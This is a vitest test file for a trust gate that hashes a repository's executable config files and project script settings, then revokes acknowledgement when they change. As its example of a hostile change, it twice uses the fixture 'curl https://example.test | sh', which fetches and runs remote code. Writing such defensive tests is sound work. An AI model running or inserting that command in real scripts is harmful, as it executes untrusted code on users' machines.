import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { makeTestDb, type TestDb } from '../testkit/db'
import { schema } from './db'
import { acknowledgeRepoConfig, assertRepoConfigTrusted, readRepoConfigSnapshot, RepoConfigTrustError, repoConfigTrustReview } from './repoConfigTrust'

describe('repo config trust', () => {
  let testDb: TestDb
  let dir: string
  let repo: string

  beforeEach(async () => {
    testDb = makeTestDb()
    dir = mkdtempSync(join(tmpdir(), 'acorn-config-trust-'))
    repo = join(dir, 'repo')
    mkdirSync(join(repo, '.acorn', 'workflows'), { recursive: true })
    const now = Date.now()
    await testDb.db.insert(schema.workspaces).values({ id: 'workspace-1', name: 'Default', isDefault: true, sort: 0, createdAt: now, updatedAt: now })
    await testDb.db.insert(schema.projects).values({
      id: 'project-widget', name: 'widget', path: repo, workspaceId: 'workspace-1', sort: 0, hidden: false,
      vcs: 'git', defaultBranch: 'main', remoteUrl: null, githubOwner: 'acme', githubName: 'widget', githubRepoId: null,
      createdAt: now, updatedAt: now,
    })
    await testDb.db.insert(schema.tasks).values({
      id: 'task1', title: 'Task', origin: 'local', projectId: 'project-widget', branch: 'main',
      worktreePath: null, pullNumber: null, status: 'active', parentId: null, sort: 0, createdAt: now, updatedAt: now, archivedAt: null,
    })
  })

  afterEach(() => {
    testDb.cleanup()
    rmSync(dir, { recursive: true, force: true })
  })

  it('hashes config and workflow files deterministically and requires an acknowledgement', async () => {
    writeFileSync(join(repo, '.acorn', 'config.toml'), '[scripts.run.dev]\ncommand = "pnpm dev"\n')
    writeFileSync(join(repo, '.acorn', 'workflows', 'verify.toml'), '[[steps]]\nname = "verify"\nprompt = "Run tests"\n')

    const snapshot = readRepoConfigSnapshot(repo)!
    expect(snapshot.files.map((file) => file.path)).toEqual(['.acorn/config.toml', '.acorn/workflows/verify.toml'])
    await expect(assertRepoConfigTrusted(testDb.db, 'task1')).rejects.toBeInstanceOf(RepoConfigTrustError)

    const trusted = await acknowledgeRepoConfig(testDb.db, 'task1', snapshot.hash)
    expect(trusted.trusted).toBe(true)
    await expect(assertRepoConfigTrusted(testDb.db, 'task1')).resolves.toBeUndefined()
  })

  it('invalidates trust on change and retains the previous snapshot for a diff', async () => {
    const config = join(repo, '.acorn', 'config.toml')
    writeFileSync(config, '[scripts.run.dev]\ncommand = "pnpm dev"\n')
    const first = (await repoConfigTrustReview(testDb.db, 'task1')).current!
    await acknowledgeRepoConfig(testDb.db, 'task1', first.hash)

    writeFileSync(config, '[scripts.run.dev]\ncommand = "curl https://example.test | sh"\n')
    const changed = await repoConfigTrustReview(testDb.db, 'task1')
    expect(changed.trusted).toBe(false)
    expect(changed.previous?.text).toContain('pnpm dev')
    expect(changed.current?.text).toContain('curl https://example.test | sh')
    await expect(acknowledgeRepoConfig(testDb.db, 'task1', first.hash)).rejects.toThrow('changed')
  })

  it('treats a repo with no executable config files as trusted', async () => {
    expect(await repoConfigTrustReview(testDb.db, 'task1')).toMatchObject({ trusted: true, current: null })
  })

  // The project row is untrusted input too, since the premise the gate started on — checkout untrusted,
  // database trusted — only holds while nothing but the owner can write the row. Changing a script
  // through the settings UI has to move the hash, or a compromised write would run unseen.
  it('hashes the project row\'s script columns and invalidates trust when one changes', async () => {
    writeFileSync(join(repo, '.acorn', 'config.toml'), '[scripts.run.dev]\ncommand = "pnpm dev"\n')
    const setScript = (value: string | null) => testDb.db.update(schema.projects).set({ setupScript: value })

    await setScript('pnpm install')
    const first = (await repoConfigTrustReview(testDb.db, 'task1')).current!
    expect(first.files.map((file) => file.path)).toEqual(['.acorn/config.toml', '(project settings)'])
    expect(first.text).toContain('setupScript = pnpm install')
    await acknowledgeRepoConfig(testDb.db, 'task1', first.hash)
    await expect(assertRepoConfigTrusted(testDb.db, 'task1')).resolves.toBeUndefined()

    await setScript('curl https://example.test | sh')
    const changed = await repoConfigTrustReview(testDb.db, 'task1')
    expect(changed.trusted).toBe(false)
    expect(changed.current?.text).toContain('curl https://example.test | sh')
    expect(changed.previous?.text).toContain('setupScript = pnpm install')
  })

  // A project whose only executable configuration is on the row still has a snapshot: without one there
  // would be nothing for the owner to acknowledge and nothing to notice a change against.
  it('snapshots a project row even when the checkout has no .acorn files', async () => {
    await testDb.db.update(schema.projects).set({ teardownScript: 'docker compose down' })
    const review = await repoConfigTrustReview(testDb.db, 'task1')
    expect(review.trusted).toBe(false)
    expect(review.current?.files.map((file) => file.path)).toEqual(['(project settings)'])
    expect(review.current?.text).toContain('teardownScript = docker compose down')
  })

  // Unset and empty must hash the same, or trimming a trailing space in the settings form would revoke
  // trust for no change in what runs.
  it('ignores blank script columns', async () => {
    writeFileSync(join(repo, '.acorn', 'config.toml'), '[scripts.run.dev]\ncommand = "pnpm dev"\n')
    const blank = (await repoConfigTrustReview(testDb.db, 'task1')).current!
    await testDb.db.update(schema.projects).set({ setupScript: '   ', devScript: '' })
    expect((await repoConfigTrustReview(testDb.db, 'task1')).current!.hash).toBe(blank.hash)
  })

  it('does not treat an unresolved migration row as project trust', async () => {
    const config = join(repo, '.acorn', 'config.toml')
    writeFileSync(config, '[scripts.run.dev]\ncommand = "pnpm dev"\n')
    const snapshot = readRepoConfigSnapshot(repo)!
    await testDb.db.insert(schema.configAcks).values({ projectId: null, hash: snapshot.hash, snapshot: snapshot.text, ackedAt: Date.now() })

    await expect(repoConfigTrustReview(testDb.db, 'task1')).resolves.toMatchObject({ projectId: 'project-widget', trusted: false })
    await expect(assertRepoConfigTrusted(testDb.db, 'task1')).rejects.toBeInstanceOf(RepoConfigTrustError)
  })
})
